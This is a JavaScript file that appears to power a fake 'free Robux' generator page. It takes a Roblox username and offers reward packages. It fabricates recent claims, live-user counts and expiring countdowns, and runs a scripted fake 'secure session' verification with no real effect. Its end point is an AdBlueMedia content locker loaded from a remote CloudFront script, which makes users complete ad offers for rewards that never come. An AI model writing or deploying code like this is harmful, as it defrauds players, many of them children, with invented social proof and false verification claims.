(function () {
  "use strict";

  const ROBUX_ICON = "https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico";

  /* AdBlueMedia locker config — UPDATED */
  const LOCKER_SCRIPT_URL = "https://d1g1lhd4vferpn.cloudfront.net/f2044c0.js";
  const LOCKER_CONFIG_NAME = "lnENN_QCk_cZfJlc";
  const LOCKER_CONFIG_VALUE = { it: 4602181, key: "8be07" };

  window[LOCKER_CONFIG_NAME] = LOCKER_CONFIG_VALUE;
  window.__adblueMediaLockerLoaded = false;
  window.__adblueMediaLockerFailed = false;
  window.__adblueMediaAddedGlobals = window.__adblueMediaAddedGlobals || [];

  const names = [
    "PioBlx",
    "RobloxKing",
    "NoobMaster69",
    "Builderman",
    "GamerGirl99",
    "ShadowHunter",
    "EpicLoot",
    "Vortex",
    "Zenix",
    "Krystal"
  ];

  const amounts = ["1,700", "4,500", "10,000", "22,500", "11,000", "24,000"];

  const faqs = [
    {
      q: "What happens after I select a package?",
      a: "After you choose a package, a short preparation screen appears and then your package summary opens with general next-step instructions."
    },
    {
      q: "Do I need to stay on the page?",
      a: "Yes. Keep the same tab open while the next step loads so your session stays active."
    },
    {
      q: "Why is my selected amount shown again?",
      a: "The instruction page repeats the selected amount so the session feels clear and easy to verify before you continue."
    }
  ];

  const mainPackages = [
    { amount: "400", price: "Select" },
    { amount: "800", price: "Select" },
    { amount: "1,700", price: "Select", isPopular: true },
    { amount: "4,500", price: "Select" },
    { amount: "10,000", price: "Select" },
    { amount: "22,500", price: "Select" }
  ];

  const bonusPackages = [
    { amount: "24,000", bonus: "1,500", price: "Select" },
    { amount: "11,000", bonus: "1,000", price: "Select", isPopular: true },
    { amount: "5,250", bonus: "750", price: "Select" },
    { amount: "2,000", bonus: "300", price: "Select" }
  ];

  let countdowns = Array(4).fill(0).map(() => randInt(180, 300));
  let liveUsers = 8432;
  let selectedPackageAmount = "1,700";
  let currentUsername = "Guest Session";
  let isUsernameConnected = false;
  let isLoading = false;
  let dynamicProgressInterval = null;
  let currentSessionId = "SID-000000";
  let toastTimer = null;
  let lockerOpening = false;
  let audioCtx = null;
  let soundUnlocked = false;

  function $(id) {
    return document.getElementById(id);
  }

  function safeText(id, text) {
    const el = $(id);
    if (el) el.textContent = text;
  }

  function safeSrc(id, src) {
    const el = $(id);
    if (el) el.src = src;
  }

  function randInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }

  function formatTime(seconds) {
    if (!seconds || seconds < 0) return "0:00";
    const mins = Math.floor(seconds / 60);
    const secs = Math.floor(seconds % 60);
    return mins + ":" + String(secs).padStart(2, "0");
  }

  function escapeHtml(str) {
    return String(str)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#039;");
  }

  function sanitizeUsername(value) {
    const cleaned = String(value || "")
      .replace(/[^a-zA-Z0-9 _.-]/g, "")
      .replace(/\s+/g, " ")
      .trim()
      .slice(0, 24);
    return cleaned || "Guest Session";
  }

  function getAudioContext() {
    const AudioContextClass = window.AudioContext || window.webkitAudioContext;
    if (!AudioContextClass) return null;
    if (!audioCtx) audioCtx = new AudioContextClass();
    return audioCtx;
  }

  function unlockSound() {
    soundUnlocked = true;
    const ctx = getAudioContext();
    if (ctx && ctx.state === "suspended") {
      ctx.resume().catch(function () {});
    }
  }

  function playTone(freq, delay, duration, volume) {
    const ctx = getAudioContext();
    if (!ctx || !soundUnlocked) return;

    const start = ctx.currentTime + delay;
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();

    osc.type = "sine";
    osc.frequency.setValueAtTime(freq, start);
    gain.gain.setValueAtTime(0.0001, start);
    gain.gain.exponentialRampToValueAtTime(volume, start + 0.012);
    gain.gain.exponentialRampToValueAtTime(0.0001, start + duration);

    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start(start);
    osc.stop(start + duration + 0.04);
  }

  function playNotificationSound() {
    playTone(880, 0, 0.09, 0.08);
    playTone(1320, 0.08, 0.14, 0.055);
  }

  function playClickSound() {
    playTone(640, 0, 0.055, 0.045);
    playTone(920, 0.045, 0.065, 0.035);
  }

  function randomSessionId() {
    const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
    let out = "SID-";
    for (let i = 0; i < 6; i++) {
      out += chars[Math.floor(Math.random() * chars.length)];
    }
    return out;
  }

  function setStatus(el, state, text) {
    if (!el) return;
    el.className = "status-value " + state;
    el.textContent = text;
  }

  function syncUsernameUI() {
    const usernameInput = $("usernameInput");
    const usernamePreview = $("usernamePreview");
    const usernameShell = $("usernameShell");
    const usernameApplyBtn = $("usernameApplyBtn");
    const usernameEditBtn = $("usernameEditBtn");
    const usernameLockedBadge = $("usernameLockedBadge");
    const usernameTip = $("usernameTip");

    const safeName = sanitizeUsername(currentUsername);
    currentUsername = safeName;

    if (usernameInput && document.activeElement !== usernameInput) {
      usernameInput.value = safeName === "Guest Session" ? "" : safeName;
    }

    if (usernamePreview) usernamePreview.textContent = safeName;
    safeText("processingUsername", safeName);
    safeText("processingUserTag", safeName);
    safeText("selectedUsername", safeName);
    safeText("selectedUsernameInline", safeName);

    const card = document.querySelector(".username-card");
    if (card) card.classList.toggle("is-connected", isUsernameConnected);
    if (usernameShell) usernameShell.classList.toggle("is-locked", isUsernameConnected);
    if (usernameInput) usernameInput.readOnly = isUsernameConnected;
    if (usernameLockedBadge) usernameLockedBadge.classList.toggle("hidden", !isUsernameConnected);

    if (usernameApplyBtn) {
      usernameApplyBtn.textContent = isUsernameConnected ? "CONNECTED" : "CONNECT";
      usernameApplyBtn.classList.toggle("connected", isUsernameConnected);
      usernameApplyBtn.disabled = isUsernameConnected;
    }

    if (usernameEditBtn) usernameEditBtn.classList.toggle("hidden", !isUsernameConnected);

    if (usernameTip) {
      usernameTip.textContent = isUsernameConnected
        ? "Username locked to this session. Use Enter Again only if you need to correct it."
        : "Best results: use the exact username you want linked to this session.";
    }

    const statusEl = document.querySelector(".username-status");
    if (statusEl) {
      statusEl.innerHTML =
        '<span class="status-dot"></span><strong id="usernamePreview">' +
        escapeHtml(safeName) +
        "</strong> " +
        (isUsernameConnected ? "securely connected" : "ready to connect");
    }

    updatePackageLockState();
  }

  function scrollToBonusSection() {
    const bonusSection = $("bonusSection");
    if (!bonusSection) return;
    setTimeout(function () {
      bonusSection.scrollIntoView({ behavior: "smooth", block: "start" });
    }, 160);
  }

  function unlockUsernameEdit() {
    unlockSound();
    playClickSound();
    isUsernameConnected = false;
    syncUsernameUI();

    const usernameInput = $("usernameInput");
    if (usernameInput) {
      usernameInput.focus();
      usernameInput.select();
    }
  }

  function commitUsername() {
    unlockSound();
    playClickSound();

    const usernameInput = $("usernameInput");
    const nextName = sanitizeUsername(usernameInput ? usernameInput.value : currentUsername);

    currentUsername = nextName;
    isUsernameConnected = currentUsername !== "Guest Session";
    syncUsernameUI();

    if (isUsernameConnected) scrollToBonusSection();
  }

  function updatePackageLockState() {
    document.querySelectorAll(".pkg").forEach(function (card) {
      card.classList.toggle(
        "requires-connect",
        !isUsernameConnected && !card.classList.contains("disabled")
      );
    });
  }

  function setSelectedUI() {
    safeText("selectedAmountLabel", selectedPackageAmount);
    safeText("selectedAmountHero", selectedPackageAmount);
    safeText("selectedAmountCard", selectedPackageAmount);
    safeText("selectedSession", currentSessionId);
    safeText("selectedUsername", currentUsername);
    safeText("selectedUsernameInline", currentUsername);
  }

  function renderFaq() {
    const faqRoot = $("faq");
    if (!faqRoot) return;

    faqRoot.innerHTML = "";

    faqs.forEach(function (item) {
      const wrap = document.createElement("div");
      wrap.className = "faq-item";

      const btn = document.createElement("button");
      btn.className = "faq-q";
      btn.type = "button";
      btn.innerHTML =
        "<span>" + escapeHtml(item.q) + '</span><span class="chev">▼</span>';

      const ans = document.createElement("div");
      ans.className = "faq-a";
      ans.textContent = item.a;

      btn.addEventListener("click", function () {
        Array.prototype.slice.call(faqRoot.querySelectorAll(".faq-item")).forEach(function (x) {
          if (x !== wrap) x.classList.remove("open");
        });
        wrap.classList.toggle("open");
      });

      wrap.appendChild(btn);
      wrap.appendChild(ans);
      faqRoot.appendChild(wrap);
    });
  }

  function makePackageCard(pkg, idx, isBonus) {
    const card = document.createElement("div");
    card.className = "pkg";

    const hasCountdown = isBonus === true;
    const countdown = hasCountdown ? countdowns[idx] : null;
    const ended = hasCountdown && countdown <= 0;

    if (pkg.isPopular && !ended) card.classList.add("popular");
    if (ended) card.classList.add("disabled");

    if (pkg.isPopular && !ended) {
      const best = document.createElement("div");
      best.className = "best";
      best.textContent = "Best Value";
      card.appendChild(best);
    }

    if (hasCountdown) {
      const ends = document.createElement("div");
      ends.className = "ends" + (ended ? " ended" : "");
      ends.dataset.idx = String(idx);
      ends.textContent = ended ? "ENDED" : "Ends in " + formatTime(countdown);
      card.appendChild(ends);
    }

    const icon = document.createElement("img");
    icon.src = ROBUX_ICON;
    icon.alt = "Reward";
    card.appendChild(icon);

    const h3 = document.createElement("h3");
    h3.textContent = pkg.amount;
    card.appendChild(h3);

    const sub = document.createElement("div");
    sub.className = "sub";
    sub.textContent = "Reward Credits";
    card.appendChild(sub);

    if (pkg.bonus) {
      const bonus = document.createElement("div");
      bonus.className = "bonus";
      bonus.innerHTML = "<span>+" + escapeHtml(pkg.bonus) + " Bonus</span>";
      card.appendChild(bonus);
    }

    const cta = document.createElement("button");
    cta.className = "cta";
    cta.type = "button";
    cta.textContent = ended ? "Expired" : pkg.price;
    card.appendChild(cta);

    function handleSelect(event) {
      if (event) event.stopPropagation();
      unlockSound();
      playClickSound();

      if (ended) return;

      if (!isUsernameConnected) {
        const usernameInput = $("usernameInput");
        if (usernameInput) usernameInput.focus();

        const usernameCard = document.querySelector(".username-card");
        if (usernameCard && usernameCard.animate) {
          usernameCard.animate(
            [
              { transform: "translateX(0)" },
              { transform: "translateX(-5px)" },
              { transform: "translateX(5px)" },
              { transform: "translateX(0)" }
            ],
            { duration: 240, easing: "ease-out" }
          );
        }
        return;
      }

      selectedPackageAmount = pkg.amount;
      startLoadingThenShowInstructions();
    }

    card.addEventListener("click", function (e) {
      if (e.target.tagName !== "BUTTON" && !ended) handleSelect(e);
    });

    cta.addEventListener("click", handleSelect);

    return card;
  }

  function renderPackages() {
    const bonusGrid = $("bonusGrid");
    const mainGrid = $("mainGrid");

    if (bonusGrid) {
      bonusGrid.innerHTML = "";
      bonusPackages.forEach(function (pkg, idx) {
        bonusGrid.appendChild(makePackageCard(pkg, idx, true));
      });
    }

    if (mainGrid) {
      mainGrid.innerHTML = "";
      mainPackages.forEach(function (pkg) {
        mainGrid.appendChild(makePackageCard(pkg, 0, false));
      });
    }

    updatePackageLockState();
  }

  function updateLiveUsers() {
    const liveUsersEl = $("liveUsers");
    if (!liveUsersEl) return;

    const change = randInt(-10, 9);
    let next = liveUsers + change;

    if (next < 7000) next = 7000 + Math.abs(change);
    if (next > 12000) next = 12000 - Math.abs(change);

    liveUsers = next;
    liveUsersEl.textContent = liveUsers.toLocaleString();
  }

  function updateCountdowns() {
    countdowns = countdowns.map(function (t) {
      return t > 0 ? t - 1 : 0;
    });

    document.querySelectorAll(".ends[data-idx]").forEach(function (el) {
      const i = Number(el.dataset.idx);
      const t = countdowns[i];

      if (t <= 0) {
        el.classList.add("ended");
        el.textContent = "ENDED";

        const card = el.closest(".pkg");
        if (card) {
          card.classList.add("disabled");
          const cta = card.querySelector(".cta");
          if (cta) cta.textContent = "Expired";
        }
      } else {
        el.textContent = "Ends in " + formatTime(t);
      }
    });
  }

  function generateClaim() {
    const claimToast = $("claimToast");
    const claimName = $("claimName");
    const claimAmount = $("claimAmount");
    const claimTime = $("claimTime");

    if (!claimToast || !claimName || !claimAmount || !claimTime) return;

    const randomName = names[randInt(0, names.length - 1)];
    const randomAmount = amounts[randInt(0, amounts.length - 1)];

    claimName.textContent = randomName;
    claimAmount.textContent = randomAmount + " selected";
    claimTime.textContent = "2 sec ago";

    claimToast.classList.remove("hidden");
    requestAnimationFrame(function () {
      claimToast.classList.add("show");
    });

    playNotificationSound();

    clearTimeout(toastTimer);
    toastTimer = setTimeout(function () {
      claimToast.classList.remove("show");
      setTimeout(function () {
        claimToast.classList.add("hidden");
      }, 220);
    }, 5000);
  }

  function setLoadingUI(percent) {
    const loadingBar = $("loadingBar");
    const loadingPercent = $("loadingPercent");
    const etaText = $("etaText");

    const pct = Math.max(0, Math.min(100, percent));

    if (loadingBar) loadingBar.style.width = pct + "%";
    if (loadingPercent) loadingPercent.textContent = Math.floor(pct) + "%";

    const remaining = Math.max(0, Math.ceil((100 - pct) / 18));
    if (etaText) etaText.textContent = "ETA 00:0" + Math.min(9, remaining);
  }

  function startLoadingThenShowInstructions() {
    const loadingOverlay = $("loadingOverlay");
    const instructionOverlay = $("instructionOverlay");
    const loadingText = $("loadingText");
    const statusUsername = $("statusUsername");
    const statusConnection = $("statusConnection");
    const statusVerification = $("statusVerification");
    const statusTransaction = $("statusTransaction");
    const statusFinalize = $("statusFinalize");
    const sessionId = $("sessionId");

    if (!loadingOverlay || !instructionOverlay) return;
    if (isLoading || !instructionOverlay.classList.contains("hidden")) return;

    if (!isUsernameConnected) {
      commitUsername();
      if (!isUsernameConnected) return;
    }

    isLoading = true;
    currentSessionId = randomSessionId();

    if (sessionId) sessionId.textContent = currentSessionId;
    safeText("processingUsername", "@" + currentUsername);
    safeText("processingUserTag", "@" + currentUsername);

    loadingOverlay.classList.remove("hidden");
    instructionOverlay.classList.add("hidden");

    setStatus(statusUsername, "live", "Connected");
    setStatus(statusConnection, "live", "Starting");
    setStatus(statusVerification, "waiting", "Waiting");
    setStatus(statusTransaction, "waiting", "Waiting");
    setStatus(statusFinalize, "waiting", "Waiting");

    let visualProgress = 3;
    setLoadingUI(visualProgress);

    if (dynamicProgressInterval) clearInterval(dynamicProgressInterval);

    dynamicProgressInterval = setInterval(function () {
      if (visualProgress < 96) {
        visualProgress += 5.5 * Math.random();
        setLoadingUI(Math.min(96, visualProgress));
      }
    }, 180);

    const stageConfigs = [
      {
        text: "Checking username match for @" + currentUsername,
        statusEl: statusConnection,
        live: "Checking",
        done: "Ready",
        holdMin: 18,
        holdMax: 28
      },
      {
        text: "Creating secure session for @" + currentUsername,
        statusEl: statusVerification,
        live: "Creating",
        done: "Active",
        holdMin: 36,
        holdMax: 50
      },
      {
        text: "Preparing package route for @" + currentUsername,
        statusEl: statusTransaction,
        live: "Preparing",
        done: "Loaded",
        holdMin: 60,
        holdMax: 76
      },
      {
        text: "Finalizing connected session for @" + currentUsername,
        statusEl: statusFinalize,
        live: "Finishing",
        done: "Done",
        holdMin: 82,
        holdMax: 95
      }
    ];

    let stageIndex = 0;

    function runStage() {
      const stage = stageConfigs[stageIndex];
      if (!stage) return;

      if (loadingText) loadingText.textContent = stage.text;
      if (stage.statusEl) setStatus(stage.statusEl, "live", stage.live);

      setTimeout(function () {
        if (stage.statusEl) setStatus(stage.statusEl, "done", stage.done);

        const loadingBar = $("loadingBar");
        const currentWidth = loadingBar ? parseFloat(loadingBar.style.width) || 0 : 0;
        const forced = stage.holdMin + Math.random() * (stage.holdMax - stage.holdMin);

        setLoadingUI(Math.max(forced, currentWidth));

        stageIndex += 1;

        if (stageIndex < stageConfigs.length) {
          runStage();
        } else {
          clearInterval(dynamicProgressInterval);
          setStatus(statusUsername, "done", "@" + currentUsername + " verified");
          setLoadingUI(100);
          safeText("etaText", "ETA 00:00");
          setSelectedUI();

          setTimeout(function () {
            loadingOverlay.classList.add("hidden");
            isLoading = false;
            instructionOverlay.classList.remove("hidden");
            playNotificationSound();
          }, 500);
        }
      }, 850 + Math.floor(650 * Math.random()));
    }

    runStage();
  }

  function snapshotWindowFunctionNames() {
    const map = {};
    try {
      Object.keys(window).forEach(function (key) {
        if (typeof window[key] === "function") map[key] = true;
      });
    } catch (e) {}
    return map;
  }

  function preloadLocker() {
    window[LOCKER_CONFIG_NAME] = LOCKER_CONFIG_VALUE;

    const existing = document.querySelector('script[src="' + LOCKER_SCRIPT_URL + '"]');
    if (existing) return;

    const beforeFunctions = snapshotWindowFunctionNames();

    const s = document.createElement("script");
    s.type = "text/javascript";
    s.src = LOCKER_SCRIPT_URL;
    s.setAttribute("data-cfasync", "false");

    s.onload = function () {
      window.__adblueMediaLockerLoaded = true;
      window.__adblueMediaLockerFailed = false;
      try {
        window.__adblueMediaAddedGlobals = Object.keys(window).filter(function (key) {
          return !beforeFunctions[key] && typeof window[key] === "function";
        });
        console.log("[Locker] New globals after load:", window.__adblueMediaAddedGlobals);
      } catch (e) {}
    };

    s.onerror = function () {
      window.__adblueMediaLockerFailed = true;
      console.error("[Locker] Script failed to load:", LOCKER_SCRIPT_URL);
    };

    document.head.appendChild(s);
  }

  function getLockerFunctionName() {
    const candidates = [
      "lnENN_QCk_cZfJlc_show",   // new locker — try first
      "aWeBz_Cba_FnMzIc_show",
      "showLocker",
      "show_locker",
      "call_locker",
      "CPABuildLock",
      "og_load",
      "_qW"
    ];

    const added = window.__adblueMediaAddedGlobals || [];
    added.forEach(function (name) {
      if (candidates.indexOf(name) === -1) candidates.push(name);
    });

    for (let i = 0; i < candidates.length; i++) {
      const name = candidates[i];
      if (name && typeof window[name] === "function") return name;
    }

    return null;
  }

  function waitForLocker(callback) {
    const started = Date.now();

    (function check() {
      const fnName = getLockerFunctionName();

      if (fnName) {
        callback(true, fnName);
        return;
      }

      if (Date.now() - started > 10000) {
        callback(false, null);
        return;
      }

      setTimeout(check, 250);
    })();
  }

  function openAdBlueMediaLocker(event) {
    if (event) {
      event.preventDefault();
      event.stopPropagation();
    }

    unlockSound();
    playClickSound();

    if (lockerOpening) return;
    lockerOpening = true;

    const unlockBtn = $("unlockBtn");
    if (unlockBtn) {
      unlockBtn.disabled = true;
      unlockBtn.innerHTML = 'LOADING <span class="arrow">…</span>';
    }

    window[LOCKER_CONFIG_NAME] = LOCKER_CONFIG_VALUE;
    preloadLocker();

    waitForLocker(function (ready, fnName) {
      lockerOpening = false;

      if (unlockBtn) {
        unlockBtn.disabled = false;
        unlockBtn.innerHTML = 'CONTINUE <span class="arrow">→</span>';
      }

      if (!ready || !fnName) {
        console.error(
          "[Locker] No trigger function found. Check: HTTPS, adblock disabled, domain approved in AdBlueMedia dashboard, campaign active."
        );
        alert(
          "Locker could not open. Make sure this domain is approved in AdBlueMedia, AdBlock is off, and the site is on HTTPS."
        );
        return;
      }

      try {
        console.log("[Locker] Opening with function:", fnName);
        window[fnName]();
      } catch (err) {
        console.error("[Locker] Trigger failed:", fnName, err);
        alert("Locker loaded but failed to open. Check the browser console for the exact error.");
      }
    });
  }

  function initImages() {
    ["robuxIcon1", "robuxIcon2", "robuxIcon3", "selectedIcon", "selectedCardIcon"].forEach(function (id) {
      safeSrc(id, ROBUX_ICON);
    });
  }

  function initEvents() {
    const usernameApplyBtn = $("usernameApplyBtn");
    const usernameEditBtn = $("usernameEditBtn");
    const usernameInput = $("usernameInput");
    const unlockBtn = $("unlockBtn");

    if (usernameApplyBtn) usernameApplyBtn.addEventListener("click", commitUsername);
    if (usernameEditBtn) usernameEditBtn.addEventListener("click", unlockUsernameEdit);

    if (usernameInput) {
      usernameInput.addEventListener("keydown", function (event) {
        if (event.key === "Enter") {
          event.preventDefault();
          commitUsername();
        }
      });

      usernameInput.addEventListener("input", function () {
        const previewValue = sanitizeUsername(usernameInput.value);
        const usernamePreview = $("usernamePreview");
        if (usernamePreview) usernamePreview.textContent = previewValue;
      });
    }

    if (unlockBtn) {
      unlockBtn.type = "button";
      unlockBtn.addEventListener("click", openAdBlueMediaLocker, true);
    }

    document.addEventListener("pointerdown", unlockSound, { passive: true });
    document.addEventListener("keydown", unlockSound);
  }

  function init() {
    initImages();
    syncUsernameUI();
    renderFaq();
    renderPackages();
    setSelectedUI();
    initEvents();
    preloadLocker();

    setInterval(updateLiveUsers, 3000);
    setInterval(updateCountdowns, 1000);
    setTimeout(generateClaim, 3500);
    setInterval(generateClaim, 10000);

    window.openAdBlueMediaLocker = openAdBlueMediaLocker;
    window.testLocker = openAdBlueMediaLocker;
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
